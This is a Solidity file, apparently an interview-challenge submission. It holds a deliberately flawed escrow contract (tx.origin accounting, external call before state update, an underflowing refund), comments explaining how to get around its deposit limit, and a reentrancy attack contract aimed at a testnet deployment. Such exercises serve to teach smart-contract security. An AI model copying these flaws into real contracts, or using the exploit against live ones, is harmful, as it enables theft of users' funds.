/**
 *Submitted for verification at Etherscan.io on 2021-11-12
*/

// SPDX-License-Identifier: Unlicense

pragma solidity 0.6.12;



// Part: DaoEscrowFarm

// Offchain Labs Solidity technical challenge:

// Examine the DaoEscrowFarm contract provided.

// This is a simple system that allows users to deposit 1 eth per block, and withdraw their deposits in a future date.
// The implementation contains many flaws, including lack of optimisations and bugs that can be exploited to steal funds.


// ----------------------------------------------------------------------------------
// ----------------------------------------------------------------------------------


// For this challenge we would like you to:

//  - Explain how someone could deposit more than 1 eth per block:
// EXPLANATION:
//      Method 1) Someone can create more than 1 account e send a transaction with at most 1 ether to the DaoEscrowFarm contract
//                with all his accounts at the same time.
//                By doing so there's the possibility that in just one block there will be multiple transactions,
//                all to the same address but each one with a different sender and tx.origin.

//      Method 2) Since the contract stores what has been the last block for a certain tx.origin,
//                and since in a simple call chain "A -> B -> C", inside C the value of tx.origin is A,
//                someone can create his own contract with inside a function to send at most 1 ether to the DaoEscrowFarm contract,
//                then transfer to his own contract Y ethers (Y > 1) and then
//                call this send function with different accounts so that inside DaoEscrowFarm tx.origin will be different for each call,
//                even if they all have the same msg.sender and they all are in the same block.


//  - Find a reentrancy vulnerability and send us a sample contract that exploits it

//  - Optimise the `receive` function so that it is at least 20% cheaper and send a sample contract showing how the optimisation is done.


// ----------------------------------------------------------------------------------
// ----------------------------------------------------------------------------------


// We don't expect you to spend more than 30 minutes on the challenge. It's not required to find all the issues, but to demonstrate and explain the ones that you do find.

/// @title This is a demo interview contract. Do not use in production!!


// ----------------------------------------------------------------------------------
// ----------------------------------------------------------------------------------


// Deployed on Rinkeby testnet at: 0xe8213dc410494428961Abee30857901Abb7BC44C

contract DaoEscrowFarm {
  uint256 immutable DEPOSIT_LIMIT_PER_BLOCK = 1 ether;

  struct UserDeposit {
    uint256 balance;
    uint256 blockDeposited;
  }

  mapping(address => UserDeposit) public deposits;

  constructor() public {}

  receive() external payable {
    require(msg.value <= DEPOSIT_LIMIT_PER_BLOCK, "TOO_MUCH_ETH");

    UserDeposit storage prev = deposits[tx.origin];

    uint256 maxDeposit = prev.blockDeposited == block.number
      ? DEPOSIT_LIMIT_PER_BLOCK - prev.balance
      : DEPOSIT_LIMIT_PER_BLOCK;

    if(msg.value > maxDeposit) {
      // refund user if they are above the max deposit allowed
      uint256 refundValue = maxDeposit - msg.value;
      
      (bool success,) = msg.sender.call{value: refundValue}("");
      require(success, "ETH_TRANSFER_FAIL");
      
      prev.balance -= refundValue;
    }

    prev.balance += msg.value;
    prev.blockDeposited = block.number;
  }

  

  function withdraw(uint256 amount) external {
    UserDeposit storage prev = deposits[tx.origin];
    require(prev.balance >= amount, "NOT_ENOUGH_ETH");

    prev.balance -= amount;
    
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "ETH_TRANSFER_FAIL");
  }
}

// File: ReentrancyAttack.sol

// deployed on Rinkeby at:

contract ReentrancyAttack {
  DaoEscrowFarm daoEscrowFactor = DaoEscrowFarm(0xe8213dc410494428961Abee30857901Abb7BC44C);

  constructor() public payable { }

  function hackDeposit() external {
    uint256 firstValue = 0.5 ether;
    uint256 secondValue = 0.6 ether;

    payable(daoEscrowFactor).call{value: firstValue}("");
    payable(daoEscrowFactor).call{value: secondValue}("");
  }

  receive() external payable {
    call_receive();
  }

  function call_receive() private {
    uint256 value_to_send = 0.5 ether;
    uint256 second_value_to_send = 0.6 ether;

    payable(daoEscrowFactor).call{value: value_to_send}("");
    payable(daoEscrowFactor).call{value: second_value_to_send}("");
  }

  function getBalance_victimContract() external view returns (uint256) {
    return address(daoEscrowFactor).balance;
  }
}